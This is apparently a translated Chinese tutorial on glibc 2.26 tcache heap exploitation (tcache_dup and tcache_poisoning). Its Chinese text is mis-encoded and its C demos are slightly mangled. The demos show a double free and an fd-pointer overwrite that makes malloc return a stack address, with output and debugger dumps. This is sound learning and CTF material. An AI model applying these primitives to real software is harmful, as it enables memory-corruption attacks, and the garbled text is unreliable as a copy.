# how2heapä¹‹å®Œç»“ç¯‡
##### è¯‘æ–‡å£°æ˜Ž
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŽŸæ–‡ä¸ºå‡†ã€‚
> æ¬¢è¿Žå„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
>
> ç»ˆäºŽåˆ°äº†glibc2.26ï¼Œæœ¬èŠ‚åŒ…æ‹¬tcache_dup,tcache_poisoning,tcache_house_of_spirit,house_of_spirit(ä¹±å…¥),house_of_botcake
PS:ç”±äºŽæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿Žå„ä½æ–§æ­£ ðŸ™‚
## å‚è€ƒç½‘ç«™
    https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/
    https://hackmd.io/@DIuvbu1vRU2C5FwWIMzZ_w/HkyVl98b8
## tcache_dup
###  åº
glibcç‰ˆæœ¬å¤§äºŽ2.26ä¹‹åŽï¼Œå¼•å…¥äº†tcacheè¿™ä¸€æ–°æœºåˆ¶ï¼Œä¹Ÿå®Œç¾Žå±•ç¤ºäº†å¦‚ä½•é€šè¿‡ç‰ºç‰²å®‰å…¨æ€§æ¥æå‡é€Ÿåº¦,å½“ç„¶å¯èƒ½ä¹Ÿå› ä¸ºå¤ªä¸å®‰å…¨äº†,åœ¨2.29ä¸­å°±æ–°å¢žäº†ä¿æŠ¤æœºåˆ¶,æ¯”å¦‚æœ¬æ–‡ä¸­çš„tcache
double freeå°±åœ¨2.29ä¸­è¢«å‘½è¿æ‰¼ä½äº†å’½å–‰,å›½å†…æ¯”èµ›2.29çš„é¢˜ç›®æ¯”è¾ƒå°‘,ä½†æ˜¯å›½é™…ä¸Šå¾ˆå¤šæ¯”èµ›æ—©å·²å¼•å…¥2.29çš„é¢˜ç›®
åœ¨åˆ†æžæ¼æ´žåˆ©ç”¨demoæ—¶ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹è¿™ä¸ªtcacheæœºåˆ¶ï¼Œè¿™é‡Œä¹Ÿå¼•å…¥ä¸€ç¯‡ä¹‹å‰æ€»ç»“çš„[æ–‡ç« ](https://nightrainy.github.io/2019/07/11/tcache%E6%9C%BA%E5%88%B6%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/)  
ï¼Œè¿˜æœ‰ctfwikiçš„å…³äºŽtcacheçš„[æ€»ç»“](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/tcache_attack-zh/)
æœ‰ä¸æƒ³è·³è½¬çš„åŒå­¦ï¼Œæˆ‘åœ¨è¿™é‡Œä¹Ÿåšä¸€ä¸ªè§£é‡Š
è¦æ³¨æ„çš„æ˜¯æ–°å¼•å…¥çš„tcacheçš„ä¼˜å…ˆçº§æ˜¯é«˜äºŽfastbinçš„
PSï¼šcallocæ˜¯ä¸ä¼šä»Žtcacheä¸­æ‹¿chunkçš„
**å…³äºŽtcache**
  1. tcacheæœ€å¤šç”±64ä¸ªbinsé“¾æŽ¥è€Œæˆï¼Œè€Œæ¯ä¸€ä¸ªbinsä¸­æœ€å¤šæ”¾7ä¸ªchunk
  2. 64ä½æœºä¸­æœ€å°sizeæ˜¯24å­—èŠ‚,æ¯16å­—èŠ‚é€’å¢žä¸€æ¬¡,è€Œ32ä½æœºä¸Šä¸º12å­—èŠ‚,æ¯8å­—èŠ‚é€’å¢žä¸€æ¬¡
  3. è¿™ä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬æœ€å¤§çš„chunkå¿…é¡»å°äºŽ0x410,ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç”³è¯·çš„sizeè¦å°äºŽ0x408(64ä½æœºä¸Š)
**æ–°çš„ç»“æž„ä½“**
åœ¨æ›´æ–°ç‰ˆæœ¬çš„æ—¶å€™ï¼Œå¼•å…¥äº†ä¸¤ä¸ªæ–°çš„ç»“æž„ä½“:tcahce_entryå’Œtcache_perthread_struct,ä¸¤ä¸ªç»“æž„ä½“çš„å®šä¹‰å¦‚ä¸‹:
    +/* We overlay this structure on the user-data portion of a chunk when
    +   the chunk is stored in the per-thread cache.  */
    +typedef struct tcache_entry
    +{
    +  struct tcache_entry *next;
    +} tcache_entry;
    +
    +/* There is one of these for each thread, which contains the
    +   per-thread cache (hence "tcache_perthread_struct").  Keeping
    +   overall size low is mildly important.  Note that COUNTS and ENTRIES
    +   are redundant (we could have just counted the linked list each
    +   time), this is for performance reasons.  */
    +typedef struct tcache_perthread_struct
    +{
    +  char counts[TCACHE_MAX_BINS];
    +  tcache_entry *entries[TCACHE_MAX_BINS];
    +} tcache_perthread_struct;
    +
    +static __thread char tcache_shutting_down = 0;
    +static __thread tcache_perthread_struct *tcache = NULL;
ä»Žå®šä¹‰ä¸­å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬çš„tcache_entryä¸ºå•é“¾è¡¨ç»“æž„
è€Œtcache_perthread_structä¸ºtcahchæœºåˆ¶çš„ä¸»ä½“ï¼Œä¸€ä¸ªé“¾è¡¨ä¸­å†…å­˜å—çš„æœ€å¤§æ•°é‡ä¸ºTCACHE_MAX_BINSå³64
**æ–°çš„å‡½æ•°**
äºŽæ­¤åŒæ—¶ï¼Œä¹Ÿæ–°åŠ äº†ä¸¤ä¸ªå‡½æ•°,tcache_get å’Œtcache_put
    +/* Caller must ensure that we know tc_idx is valid and there's room
    +   for more chunks.  */
    +static void
    +tcache_put (mchunkptr chunk, size_t tc_idx)
    +{
    +  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
    +  assert (tc_idx next = tcache->entries[tc_idx];
    +  tcache->entries[tc_idx] = e;
    +  ++(tcache->counts[tc_idx]);
    +}
    +
    +/* Caller must ensure that we know tc_idx is valid and there's
    +   available chunks to remove.  */
    +static void *
    +tcache_get (size_t tc_idx)
    +{
    +  tcache_entry *e = tcache->entries[tc_idx];
    +  assert (tc_idx entries[tc_idx] > 0);
    +  tcache->entries[tc_idx] = e->next;
    +  --(tcache->counts[tc_idx]);
    +  return (void *) e;
    +}
    +
ä»Žè¿™ä¸¤ä¸ªå‡½æ•°ä¸­ä¹Ÿå¯ä»¥çœ‹åˆ°å¼€å‘è€…å¸Œæœ›è°ƒç”¨çš„äººç¡®ä¿å‚æ•°åˆæ³•ï¼Œè¿™å°±2333  
æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨tcache_getä¸­ï¼Œæˆ‘ä»¬å”¯ä¸€éœ€è¦ä¿è¯çš„å°±æ˜¯tcache->entries[tc_idx] = e->nextï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€å®‰å…¨æ€§çš„æ€¥å‰§ä¸§å¤±
ä¸‹é¢æˆ‘ä»¬å°±ç›´æŽ¥çœ‹ä¸€ä¸‹æºä»£ç 
###  æºä»£ç 
å› ä¸ºååˆ†ç®€å•ï¼Œæ‰€ä»¥æˆ‘ä»¬ç®€å•ä¸€äº›
    #include 
    #include 
    int main()
    {
        //æœ¬demoæ˜¯ä¸€ä¸ªç®€å•çš„åˆ©ç”¨tcacheçš„double-free attack
        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.n");
        fprintf(stderr, "Allocating buffer.n");
        int *a = malloc(8);
        fprintf(stderr, "malloc(8): %pn", a);
        fprintf(stderr, "Freeing twice...n");
        free(a);
        free(a);
        fprintf(stderr, "Now the free list has [ %p, %p ].n", a, a);
        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].n", malloc(8), malloc(8));
        return 0;
    }
###  è¿è¡Œç»“æžœ
    This file demonstrates a simple double-free attack with tcache.
    Allocating buffer.
    malloc(8): 0x56028230f260
    Freeing twice...
    Now the free list has [ 0x56028230f260, 0x56028230f260 ].
    Next allocated buffers will be same: [ 0x56028230f260, 0x56028230f260 ].
###  ä»£ç è°ƒè¯•
è¿™é‡Œå°±ç›´æŽ¥æ˜¾ç¤ºfreeåŽçš„çŠ¶æ€å§
    pwndbg> bins
    tcachebins
    0x20 [  2]: 0x555555756260 â—‚â€” 0x555555756260 /* '`buUUU' */
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x0
    smallbins
    empty
    largebins
    empty
å› ä¸ºæ²¡æœ‰æ£€æŸ¥ï¼Œå› æ­¤å¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿žç»­freeä¸¤æ¬¡chunkå°±æž„é€ äº†ä¸€ä¸ªå¾ªçŽ¯
###  æ€»ç»“
æˆ‘ä»¬çŸ¥é“åœ¨Fastbin attackçš„æ—¶å€™æˆ‘ä»¬æ˜¯ä¸èƒ½ä¾æ¬¡freeä¸¤æ¬¡åŒä¸€å—chunkçš„ï¼Œä½†æ˜¯tcacheå¯ä»¥
è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŸåŽŸå› ä¹Ÿå¾ˆç®€å•ï¼Œä»Žtcache_putå‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œå®ƒå‡ ä¹Žæ²¡æœ‰è®¾ç½®ä»»ä½•æ£€æŸ¥ï¼Œä¹Ÿå°±æ„å‘³ç€æˆ‘ä»¬æ— éœ€åšä»»ä½•äº‹å°±å¯ä»¥å¯¹åŒä¸€ä¸ªchunkè¿›è¡Œå¤šæ¬¡çš„freeï¼Œç›¸æ¯”fastbin_dupæ¥è¯´ï¼Œtcache_dupçš„åˆ©ç”¨æ›´åŠ çš„ç®€å•äº†
ç„¶åŽæˆ‘ä»¬å†mallocä¸¤æ¬¡å°±å¯ä»¥å¾—åˆ°åŒä¸€å—å†…å­˜çš„chunk
å¯¹æœ¬ç¨‹åºè€Œè¨€ï¼Œç¨‹åºå…ˆmallocäº†ä¸€ä¸ªchunk a(size=8)
ç„¶åŽè¿žç»­Freeeä¸¤æ¬¡chunk a,æ­¤æ—¶åœ¨free listä¸­å°±ä¼šé“¾å…¥ä¸¤æ¬¡chunk a,
è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†ç”³è¯·ä¸¤æ¬¡chunkå°±å¯ä»¥å°†ä¸¤æ¬¡çš„chunk aå…¨éƒ¨æ‹¿å‡ºæ¥äº†
## tcache_poisoning
###  åº
å¯¹äºŽtcacheæ¥è¯´ï¼Œæˆ‘ä»¬ä¸éœ€è¦åƒfastbiné‚£æ ·ä¼ªé€ ä¸€ä¸ªsizeç¬¦åˆè¦æ±‚çš„åœ°å€æ¥ä»»æ„mallocï¼Œæˆ‘ä»¬åªéœ€è¦ç›´æŽ¥è¦†ç›–fdæŒ‡é’ˆå°±å¯ä»¥äº†
###  æºä»£ç 
    #include 
    #include 
    #include 
    int main()
    {
        //æ­¤demoçš„æ•ˆæžœå°±æ˜¯è¿”å›žä¸€ä¸ªæŒ‡å‘ä»»æ„åœ°å€çš„æŒ‡é’ˆï¼Œä¸Žfastbin corruptionæ”»å‡»æžå…¶ç›¸ä¼¼ï¼ˆæœ¬ä¾‹è¿”å›žçš„åœ°å€æ˜¯ä¸€ä¸ªæ ˆåœ°å€ï¼‰
        fprintf(stderr, "This file demonstrates a simple tcache poisoning attack by tricking malloc inton"
               "returning a pointer to an arbitrary location (in this case, the stack).n"
               "The attack is very similar to fastbin corruption attack.nn");
        size_t stack_var;
        //æˆ‘ä»¬æƒ³è¦è¿”å›žçš„åœ°å€æ˜¯stack_var
        fprintf(stderr, "The address we want malloc() to return is %p.n", (char *)&stack_var);
        fprintf(stderr, "Allocating 1 buffer.n");
        intptr_t *a = malloc(128);
        fprintf(stderr, "malloc(128): %pn", a);
        fprintf(stderr, "Freeing the buffer...n");
        free(a);
        fprintf(stderr, "Now the tcache list has [ %p ].n", a);
        //æˆ‘ä»¬é€šè¿‡è¦†å†™ç¬¬ä¸€ä¸ªchunkçš„fdæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘æˆ‘ä»¬çš„æ ˆåœ°å€
        fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %pn"
            "to point to the location to control (%p).n", sizeof(intptr_t), a, &stack_var);
        a[0] = (intptr_t)&stack_var;
        fprintf(stderr, "1st malloc(128): %pn", malloc(128));
        fprintf(stderr, "Now the tcache list has [ %p ].n", &stack_var);
        intptr_t *b = malloc(128);
        fprintf(stderr, "2nd malloc(128): %pn", b);
        fprintf(stderr, "We got the controln");
        return 0;
    }
###  è¿è¡Œç»“æžœ
    This file demonstrates a simple tcache poisoning attack by tricking malloc into
    returning a pointer to an arbitrary location (in this case, the stack).
    The attack is very similar to fastbin corruption attack.
    The address we want malloc() to return is 0x7ffeeef34a50.
    Allocating 1 buffer.
    malloc(128): 0x5560af76b260
    Freeing the buffer...
    Now the tcache list has [ 0x5560af76b260 ].
    We overwrite the first 8 bytes (fd/next pointer) of the data at 0x5560af76b260
    to point to the location to control (0x7ffeeef34a50).
    1st malloc(128): 0x5560af76b260
    Now the tcache list has [ 0x7ffeeef34a50 ].
    2nd malloc(128): 0x7ffeeef34a50
    We got the control
###  å…³é”®ä»£ç è°ƒè¯•
è¿™æ¬¡å°†æ–­ç‚¹ä¸‹åœ¨äº†
       15     intptr_t *a = malloc(128);
     â–º 16     fprintf(stderr, "malloc(128): %pn", a);
       18     free(a);
       19 
     â–º 20     fprintf(stderr, "Now the tcache list has [ %p ].n", a);
     â–º 23     a[0] = (intptr_t)&stack_var;
       28     intptr_t *b = malloc(128);
     â–º 29     fprintf(stderr, "2nd malloc(128): %pn", b);
æˆ‘ä»¬ç›´æŽ¥è¿è¡Œå°±å¥½ï¼Œé¦–å…ˆæˆ‘ä»¬ç”³è¯·äº†chunk a,æ­¤æ—¶çš„å †æ˜¯è¿™æ ·çš„
    pwndbg> heap
    0x555555756000 PREV_INUSE {
      mchunk_prev_size = 0, 
      mchunk_size = 593, 
      fd = 0x0, 
      bk = 0x0, 
      fd_nextsize = 0x0, 
      bk_nextsize = 0x0
    }